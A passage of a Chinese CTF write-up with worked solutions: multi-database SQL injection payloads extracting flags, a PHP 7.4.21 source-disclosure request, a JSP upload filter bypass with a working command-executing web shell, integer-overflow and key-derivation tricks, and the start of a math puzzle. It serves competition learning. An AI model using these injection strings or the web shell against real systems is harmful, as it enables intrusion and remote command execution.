+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">GET</span><span class="w"> </span><span class="o">/</span><span class="n">article</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">0</span><span class="o">+</span><span class="k">UNION</span><span class="o">+</span><span class="k">SELECT</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="k">SUBSTRING</span><span class="p">(</span><span class="o">`</span><span class="n">name</span><span class="o">`</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="s1">&#39;3&#39;</span><span class="o">+</span><span class="k">FROM</span><span class="o">+</span><span class="n">sqlite_master</span><span class="o">+</span><span class="k">WHERE</span><span class="o">+</span><span class="k">type</span><span class="o">%</span><span class="mi">3</span><span class="n">d</span><span class="s1">&#39;table&#39;</span><span class="o">+</span><span class="k">AND</span><span class="o">+</span><span class="n">name</span><span class="o">+</span><span class="k">NOT</span><span class="o">+</span><span class="k">IN</span><span class="o">+</span><span class="p">(</span><span class="s1">&#39;sqlite_master&#39;</span><span class="p">,</span><span class="s1">&#39;flag&#39;</span><span class="p">,</span><span class="s1">&#39;article&#39;</span><span class="p">)</span><span class="o">+</span><span class="cm">/*！UNION+SELECT+1,&#39;§2§&#39;,&#39;3&#39;*/</span><span class="w">
+</span></span></span></code></pre></div><p>得到表名：dcd97c2d</p>
+<ul>
+<li>步骤10：从sqlite_master的sql字段查询字段名，经过多次探测，字段名位于sql字段的51-58位置</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">GET</span><span class="w"> </span><span class="o">/</span><span class="n">article</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">0</span><span class="o">+</span><span class="k">UNION</span><span class="o">+</span><span class="k">SELECT</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="k">SUBSTRING</span><span class="p">(</span><span class="o">`</span><span class="k">sql</span><span class="o">`</span><span class="p">,</span><span class="mi">51</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="s1">&#39;3&#39;</span><span class="o">+</span><span class="k">FROM</span><span class="o">+</span><span class="n">sqlite_master</span><span class="o">+</span><span class="k">WHERE</span><span class="o">+</span><span class="k">type</span><span class="o">%</span><span class="mi">3</span><span class="n">d</span><span class="s1">&#39;table&#39;</span><span class="o">+</span><span class="k">AND</span><span class="o">+</span><span class="n">name</span><span class="o">+</span><span class="k">NOT</span><span class="o">+</span><span class="k">IN</span><span class="o">+</span><span class="p">(</span><span class="s1">&#39;sqlite_master&#39;</span><span class="p">,</span><span class="s1">&#39;flag&#39;</span><span class="p">,</span><span class="s1">&#39;article&#39;</span><span class="p">)</span><span class="o">+</span><span class="cm">/*!UNION+SELECT+1,&#39;§2§&#39;,&#39;3&#39;*/</span><span class="w">
+</span></span></span></code></pre></div><p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/b4683e6b96a46759bec6e42a420c61fb.png"
+    data-srcset="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/b4683e6b96a46759bec6e42a420c61fb.png, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/b4683e6b96a46759bec6e42a420c61fb.png 1.5x, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/b4683e6b96a46759bec6e42a420c61fb.png 2x"
+    data-sizes="auto"
+    alt="b4683e6b96a46759bec6e42a420c61fb.png"
+    title="b4683e6b96a46759bec6e42a420c61fb.png"/></p>
+<p>得到字段名：e1214293</p>
+<ul>
+<li>步骤11：在MySQL和MariaDB中创建表dcd97c2d</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">GET</span><span class="w"> </span><span class="o">/</span><span class="n">article</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="cm">/*!CREATE+TABLE+`dcd97c2d`(`e1214293`+TEXT)*/</span><span class="w">
+</span></span></span></code></pre></div><ul>
+<li>步骤12：查询FLAG的第一部分</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">GET</span><span class="w"> </span><span class="o">/</span><span class="n">article</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">0</span><span class="o">+</span><span class="k">UNION</span><span class="o">+</span><span class="k">SELECT</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="k">SUBSTRING</span><span class="p">(</span><span class="o">`</span><span class="n">e1214293</span><span class="o">`</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="s1">&#39;3&#39;</span><span class="o">+</span><span class="k">FROM</span><span class="o">+</span><span class="n">dcd97c2d</span><span class="o">+</span><span class="cm">/*!UNION+SELECT+1,&#39;§2§&#39;,&#39;3&#39;*/</span><span class="w">
+</span></span></span></code></pre></div><p>得到：0ops{c9045d8</p>
+<ul>
+<li>步骤13：拼接得到FLAG：0ops{c9045d86f3a94ab6604fa16bf7cc1daa}</li>
+</ul>
+<h4 id="exp-1">EXP</h4>
+<p>EXP汇总如下：</p>
+<ul>
+<li>在MariaDB中爆破表名</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">GET</span><span class="w"> </span><span class="o">/</span><span class="n">article</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">0</span><span class="o">+</span><span class="cm">/*M!+UNION+SELECT+1,SUBSTRING(TABLE_NAME,1,1),&#39;3&#39;+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=&#39;ctf&#39;+AND+TABLE_NAME+NOT+IN(&#39;flag&#39;,&#39;article&#39;)*/</span><span class="o">+</span><span class="k">UNION</span><span class="o">+</span><span class="k">SELECT</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="s1">&#39;§2§&#39;</span><span class="p">,</span><span class="s1">&#39;3&#39;</span><span class="w">
+</span></span></span></code></pre></div><p>同样爆破获得字段名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">/</span><span class="n">article</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">0</span><span class="o">+</span><span class="cm">/*M!+UNION+SELECT+1,SUBSTRING(COLUMN_NAME,1,1),&#39;3&#39;+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=&#39;d2db1ae3&#39;+AND+COLUMN_NAME!=&#39;id&#39;*/</span><span class="o">+</span><span class="k">UNION</span><span class="o">+</span><span class="k">SELECT</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="s1">&#39;§2§&#39;</span><span class="p">,</span><span class="s1">&#39;3&#39;</span><span class="w">
+</span></span></span></code></pre></div><p>查询表d2db1ae3内的字段ee8e3321得到FLAG的Part 3</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">/</span><span class="n">article</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">0</span><span class="o">+</span><span class="cm">/*M!+UNION+SELECT+1,SUBSTRING(ee8e3321,1,1),&#39;3&#39;+FROM+d2db1ae3*/</span><span class="o">+</span><span class="k">UNION</span><span class="o">+</span><span class="k">SELECT</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="s1">&#39;§2§&#39;</span><span class="p">,</span><span class="s1">&#39;3&#39;</span><span class="w">
+</span></span></span></code></pre></div><p>获得MySQL内的表名，EXP如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">GET</span><span class="w"> </span><span class="o">/</span><span class="n">article</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">0</span><span class="o">+</span><span class="cm">/*!+UNION+SELECT+1,SUBSTRING(TABLE_NAME,1,1),&#39;3&#39;+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=&#39;ctf&#39;+AND+TABLE_NAME+NOT+IN(&#39;flag&#39;,&#39;article&#39;,&#39;d2db1ae3&#39;)*/</span><span class="o">+</span><span class="k">UNION</span><span class="o">+</span><span class="k">SELECT</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="s1">&#39;§2§&#39;</span><span class="p">,</span><span class="s1">&#39;3&#39;</span><span class="w">
+</span></span></span></code></pre></div><p>获得MySQL内的字段名，EXP如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">/</span><span class="n">article</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">0</span><span class="o">+</span><span class="cm">/*!+UNION+SELECT+1,SUBSTRING(COLUMN_NAME,1,1),&#39;3&#39;+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=&#39;2b5dc37c&#39;+AND+COLUMN_NAME!=&#39;id&#39;*/</span><span class="o">+</span><span class="k">UNION</span><span class="o">+</span><span class="k">SELECT</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="s1">&#39;§2§&#39;</span><span class="p">,</span><span class="s1">&#39;3&#39;</span><span class="w">
+</span></span></span></code></pre></div><p>在MariaDB中创建表2b5dc37c</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">GET</span><span class="w"> </span><span class="o">/</span><span class="n">article</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="cm">/*M!CREATE+TABLE+`2b5dc37c`(`d4675590`+TEXT)*/</span><span class="w">
+</span></span></span></code></pre></div><p>查询表2b5dc37c内的字段d4675590得到FLAG的Part 2</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">/</span><span class="n">article</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">0</span><span class="o">+</span><span class="cm">/*!+UNION+SELECT+1,SUBSTRING(d4675590,1,1),&#39;3&#39;+FROM+2b5dc37c*/</span><span class="o">+</span><span class="k">UNION</span><span class="o">+</span><span class="k">SELECT</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="s1">&#39;§2§&#39;</span><span class="p">,</span><span class="s1">&#39;3&#39;</span><span class="w">
+</span></span></span></code></pre></div><p>在MySQL和MariaDB中创建sqlite_master表。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">GET</span><span class="w"> </span><span class="o">/</span><span class="n">article</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="cm">/*!CREATE+TABLE+`sqlite_master`(`name`+TEXT,`type`+TEXT,`sql`+TEXT)*/</span><span class="w">
+</span></span></span></code></pre></div><ul>
+<li>步骤9：从sqlite_master表查询SQLite内的flag表名</li>
+</ul>
+<pre tabindex="0"><code class="language-sqlite" data-lang="sqlite">GET /article?id=0+UNION+SELECT+1,SUBSTRING(`name`,1,1),&#39;3&#39;+FROM+sqlite_master+WHERE+type%3d&#39;table&#39;+AND+name+NOT+IN+(&#39;sqlite_master&#39;,&#39;flag&#39;,&#39;article&#39;)+/*！UNION+SELECT+1,&#39;§2§&#39;,&#39;3&#39;*/
+</code></pre><p>从sqlite_master的sql字段查询字段名</p>
+<pre tabindex="0"><code class="language-sqlite" data-lang="sqlite">GET /article?id=0+UNION+SELECT+1,SUBSTRING(`sql`,51,1),&#39;3&#39;+FROM+sqlite_master+WHERE+type%3d&#39;table&#39;+AND+name+NOT+IN+(&#39;sqlite_master&#39;,&#39;flag&#39;,&#39;article&#39;)+/*!UNION+SELECT+1,&#39;§2§&#39;,&#39;3&#39;*/
+</code></pre><p>在MySQL和MariaDB中创建表dcd97c2d</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">GET</span><span class="w"> </span><span class="o">/</span><span class="n">article</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="cm">/*!CREATE+TABLE+`dcd97c2d`(`e1214293`+TEXT)*/</span><span class="w">
+</span></span></span></code></pre></div><p>查询FLAG的第一部分</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">GET</span><span class="w"> </span><span class="o">/</span><span class="n">article</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">0</span><span class="o">+</span><span class="k">UNION</span><span class="o">+</span><span class="k">SELECT</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="k">SUBSTRING</span><span class="p">(</span><span class="o">`</span><span class="n">e1214293</span><span class="o">`</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="s1">&#39;3&#39;</span><span class="o">+</span><span class="k">FROM</span><span class="o">+</span><span class="n">dcd97c2d</span><span class="o">+</span><span class="cm">/*!UNION+SELECT+1,&#39;§2§&#39;,&#39;3&#39;*/</span><span class="w">
+</span></span></span></code></pre></div><h3 id="baby-php">baby php</h3>
+<h4 id="漏洞点-2">漏洞点</h4>
+<p>PHP &lt;=7.4.21版本的一个源码泄露漏洞</p>
+<h4 id="攻击过程-2">攻击过程</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">GET</span> <span class="o">/</span><span class="nx">flag</span><span class="o">.</span><span class="nx">php</span> <span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Host</span><span class="o">:</span> <span class="nx">penguin</span><span class="o">.</span><span class="nx">Oops</span><span class="o">.</span><span class="nx">sjtu</span><span class="o">.</span><span class="nx">cn</span><span class="o">:</span><span class="mi">60018</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">GET</span> <span class="o">/</span><span class="nx">xyz</span><span class="o">.</span><span class="nx">xyz</span> <span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+</span></span></code></pre></div><p>如上编写request，关闭BurpSuite的Update Content Length，上传即可得到flag</p>
+<h3 id="ezjsp">ezjsp</h3>
+<h4 id="考察点-3">考察点</h4>
+<p>考察java语言审计，以及Web上传和正则过滤。</p>
+<h4 id="漏洞点-3">漏洞点</h4>
+<p>根据下载的代码，可以通过POST方式上传并直接显示上传点。</p>
+<h4 id="攻击过程-3">攻击过程</h4>
+<ul>
+<li>第一步：查看Dockfile，知道根目录下的/readflag可以执行</li>
+<li>第二步：查看index.jsp代码，知道可以POST上传
+index.jsp代码如下：</li>
+</ul>
+<pre tabindex="0"><code class="language-jsp" data-lang="jsp">&lt;%
+if (&#34;POST&#34;.equalsIgnoreCase(request.getMethod())) {
+    String content = request.getReader().lines().collect(Collectors.joining(System.lineSeparator()));
+    if (content.matches(&#34;.*(\\.|\\[|\\]|\\\\u[0-9A-Fa-f]|&lt;%@|&lt;jsp:).*&#34;)) {
+        out.println(&#34;Hacker!&#34;);
+        return;
+    }
+    String path = &#34;/upload/&#34; + UUID.randomUUID().toString() + &#34;.jsp&#34;;
+    byte[] bytes = content.getBytes(StandardCharsets.US_ASCII);
+    Files.write(Paths.get(application.getRealPath(path)), bytes);
+    out.println(path);
+} else {
+    out.println(&#34;No available frontend for now. Sorry for inconvenience.&#34;);
+}
+%&gt;
+</code></pre><ul>
+<li>第三步：上传shell，EXP如下：</li>
+</ul>
+<pre tabindex="0"><code class="language-jsp" data-lang="jsp">&lt;jsp:root xmlns:jsp=&#34;http://java.sun.com/JSP/Page&#34; xmlns=&#34;http://www.w3.org/1999/xhtml&#34; version=&#34;2.0&#34;&gt;
+    &lt;jsp:expression&gt;
+        new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(request.getParameter(&#34;cmd&#34;)).getInputStream())).readLine()
+    &lt;/jsp:expression&gt;
+&lt;/jsp:root&gt;
+</code></pre><p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/33c51a8b7b63eb2da70d8a247e4b1c14.png"
+    data-srcset="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/33c51a8b7b63eb2da70d8a247e4b1c14.png, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/33c51a8b7b63eb2da70d8a247e4b1c14.png 1.5x, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/33c51a8b7b63eb2da70d8a247e4b1c14.png 2x"
+    data-sizes="auto"
+    alt="33c51a8b7b63eb2da70d8a247e4b1c14.png"
+    title="33c51a8b7b63eb2da70d8a247e4b1c14.png"/></p>
+<ul>
+<li>第四步：执行Shell：</li>
+</ul>
+<pre tabindex="0"><code>GET /upload/d83a3bb1-4798-4183-87db-7becc6808359.jsp?cmd=/readflag
+</code></pre><p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/ce7467744260883b35d4ee50dac6ae4e.png"
+    data-srcset="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/ce7467744260883b35d4ee50dac6ae4e.png, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/ce7467744260883b35d4ee50dac6ae4e.png 1.5x, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/ce7467744260883b35d4ee50dac6ae4e.png 2x"
+    data-sizes="auto"
+    alt="ce7467744260883b35d4ee50dac6ae4e.png"
+    title="ce7467744260883b35d4ee50dac6ae4e.png"/></p>
+<h4 id="exp-2">EXP</h4>
+<pre tabindex="0"><code class="language-jsp" data-lang="jsp">POST / HTTP/1.1
+Host: 78b5b560111c43eeb13837bc170a20ae.penguin.0ops.sjtu.cn:18080
+Content-Length: 323
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundarynwsHkpbBA05m9ADd
+
+&lt;jsp:root xmlns:jsp=&#34;http://java.sun.com/JSP/Page&#34; xmlns=&#34;http://www.w3.org/1999/xhtml&#34; version=&#34;2.0&#34;&gt;
+    &lt;jsp:expression&gt;
+        new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(request.getParameter(&#34;cmd&#34;)).getInputStream())).readLine()
+    &lt;/jsp:expression&gt;
+&lt;/jsp:root&gt;
+</code></pre><h2 id="pwn">PWN</h2>
+<h3 id="简单的rpg1">简单的RPG1</h3>
+<h4 id="考察点-4">考察点</h4>
+<p>C语言程序的理解和ASCII码的应用</p>
+<h4 id="攻击过程-4">攻击过程</h4>
+<p>观察<code>chall.c</code>代码，很容易发现stage1里面的这段可疑代码：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="n">choice</span> <span class="o">=</span> <span class="n">getchar</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">((</span><span class="n">choice</span><span class="o">^</span><span class="p">(</span><span class="n">status</span><span class="o">*</span><span class="mi">9</span><span class="p">)</span><span class="o">^</span><span class="mh">0x86</span><span class="p">)</span> <span class="o">==</span> <span class="n">stage1key</span><span class="p">[</span><span class="n">status</span><span class="p">]){</span>
+</span></span><span class="line"><span class="cl">            <span class="n">status</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="n">status</span><span class="o">==</span><span class="k">sizeof</span><span class="p">(</span><span class="n">stage1key</span><span class="p">))</span><span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="n">status</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">choice</span> <span class="o">==</span> <span class="sc">&#39;1&#39;</span> <span class="o">||</span> <span class="n">choice</span> <span class="o">==</span> <span class="sc">&#39;2&#39;</span><span class="p">)</span><span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></div><p>不能选1或2，而是要让<code>choice^(status*9)^0x86) == stage1key[status]</code></p>
+<p>于是编写一个简单的程序得到每个stagekey的元素对应的choice：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">int</span> <span class="n">a</span><span class="p">[]</span><span class="o">=</span><span class="p">{</span><span class="mi">157</span><span class="p">,</span> <span class="mi">212</span><span class="p">,</span> <span class="mi">213</span><span class="p">,</span> <span class="mi">134</span><span class="p">,</span> <span class="mi">249</span><span class="p">,</span> <span class="mi">234</span><span class="p">,</span> <span class="mi">171</span><span class="p">,</span> <span class="mi">226</span><span class="p">,</span> <span class="mi">140</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">135</span><span class="p">,</span> <span class="mi">167</span><span class="p">,</span> <span class="mi">241</span><span class="p">,</span> <span class="mi">168</span><span class="p">,</span> <span class="mi">188</span><span class="p">,</span> <span class="mi">26</span><span class="p">,</span> <span class="mi">77</span><span class="p">,</span> <span class="mi">92</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">118</span><span class="p">,</span> <span class="mi">118</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">27</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">60</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">20</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">key</span><span class="o">=</span><span class="mi">20</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">status</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="n">x</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">for</span><span class="p">(</span><span class="n">status</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">status</span><span class="o">&lt;</span><span class="mi">28</span><span class="p">;</span><span class="n">status</span><span class="o">++</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="mi">128</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	        <span class="k">if</span><span class="p">((</span><span class="n">i</span><span class="o">^</span><span class="p">(</span><span class="n">status</span><span class="o">*</span><span class="mi">9</span><span class="p">)</span><span class="o">^</span><span class="mh">0x86</span><span class="p">)</span><span class="o">==</span><span class="n">a</span><span class="p">[</span><span class="n">status</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">			<span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="n">printf</span><span class="p">(</span><span class="s">&#34;%d %d &#34;</span><span class="p">,</span><span class="n">status</span><span class="p">,</span><span class="n">a</span><span class="p">[</span><span class="n">status</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">				<span class="n">printf</span><span class="p">(</span><span class="s">&#34;%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">i</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// esc [ A esc [ A esc [ B esc [ B esc [ D esc [ C esc [ D esc [ C b a b a
+</span></span></span></code></pre></div><h4 id="exp-3">EXP</h4>
+<p>在做出选择时依次输入<code>esc [ A esc [ A esc [ B esc [ B esc [ D esc [ C esc [ D esc [ C b a b a</code></p>
+<h3 id="简单的rpg2">简单的RPG2</h3>
+<h4 id="考察点-5">考察点</h4>
+<p>考察C语言审计能力，以及整数的乘法导致溢出。int型占用空间4个字节，取值范围是-2147483648~2147483647。</p>
+<h4 id="漏洞点-4">漏洞点</h4>
+<p>输入大的整数，导致做乘法运算后结果溢出，变成一个较小的值。</p>
+<h4 id="攻击过程-5">攻击过程</h4>
+<ul>
+<li>第一步：获取圣剑
+根据下面代码，知道必须获得圣剑，因此第一步先买圣剑
+<img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/6f02ba6f750b00900af72d830b7f9ce6.png"
+    data-srcset="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/6f02ba6f750b00900af72d830b7f9ce6.png, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/6f02ba6f750b00900af72d830b7f9ce6.png 1.5x, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/6f02ba6f750b00900af72d830b7f9ce6.png 2x"
+    data-sizes="auto"
+    alt="6f02ba6f750b00900af72d830b7f9ce6.png"
+    title="6f02ba6f750b00900af72d830b7f9ce6.png"/></li>
+<li>第二步：购买铁树枝干
+铁树枝干是可以输入购买数量的，计算0xffffffff/50得到合适的输入值：
+<img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/8761749792516819f5395180824a8db0.png"
+    data-srcset="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/8761749792516819f5395180824a8db0.png, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/8761749792516819f5395180824a8db0.png 1.5x, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/8761749792516819f5395180824a8db0.png 2x"
+    data-sizes="auto"
+    alt="8761749792516819f5395180824a8db0.png"
+    title="8761749792516819f5395180824a8db0.png"/>
+输入85899346，因为溢出通过检查
+<img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/b49b2d007c67c54f507858bafe2cd349.png"
+    data-srcset="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/b49b2d007c67c54f507858bafe2cd349.png, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/b49b2d007c67c54f507858bafe2cd349.png 1.5x, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/b49b2d007c67c54f507858bafe2cd349.png 2x"
+    data-sizes="auto"
+    alt="b49b2d007c67c54f507858bafe2cd349.png"
+    title="b49b2d007c67c54f507858bafe2cd349.png"/></li>
+<li>第三步：过关
+<img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/012b4dbce1be6fb5fed8dcf5321917c5.png"
+    data-srcset="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/012b4dbce1be6fb5fed8dcf5321917c5.png, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/012b4dbce1be6fb5fed8dcf5321917c5.png 1.5x, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/012b4dbce1be6fb5fed8dcf5321917c5.png 2x"
+    data-sizes="auto"
+    alt="012b4dbce1be6fb5fed8dcf5321917c5.png"
+    title="012b4dbce1be6fb5fed8dcf5321917c5.png"/></li>
+</ul>
+<h4 id="exp-4">EXP</h4>
+<p>购买圣剑1把
+购买铁树枝干85899346个</p>
+<h2 id="misc">MISC</h2>
+<h3 id="baby-equation">baby equation</h3>
+<h4 id="考察点-6">考察点</h4>
+<p>很经典的一道数学题。椭圆曲线与直线的位置关系。先找到与方程等价的椭圆曲线方程，之后在曲线上找到有理点，再用椭圆曲线的性质，通过切线/割线找到更多的有理点，每次找到新的有理点，就计算对应的变量值，直到三个变量均为正数为止。</p>
+<h4 id="攻击过程-6">攻击过程</h4>
+<p>使用mathmatica计算，由于比赛允许使用搜索引擎，借鉴了知乎@酱紫君的代码：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mathematica" data-lang="mathematica"><span class="line"><span class="cl"><span class="n">n</span><span class="o">=</span><span class="mi">4</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">para</span><span class="o">=</span><span class="p">{</span><span class="n">A</span><span class="p">,</span><span class="n">B</span><span class="p">}</span><span class="o">=</span><span class="p">{</span><span class="mi">4</span><span class="n">n</span><span class="o">^</span><span class="mi">2</span><span class="o">+</span><span class="mi">12</span><span class="n">n</span><span class="mi">-3</span><span class="p">,</span><span class="mi">32</span><span class="p">(</span><span class="n">n</span><span class="o">+</span><span class="mi">3</span><span class="p">)};</span><span class="w">
